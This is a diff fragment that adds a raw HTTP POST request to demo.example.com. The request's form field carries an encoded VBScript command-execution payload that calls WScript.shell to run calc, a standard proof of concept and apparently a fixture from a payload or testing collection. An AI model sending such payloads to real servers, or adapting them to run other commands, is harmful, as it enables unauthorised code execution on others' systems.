@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Connection: close
+
+q=o=CreateObject(&#x22;WScript.shell&#x22;).run(&#x22;calc&#x22;)
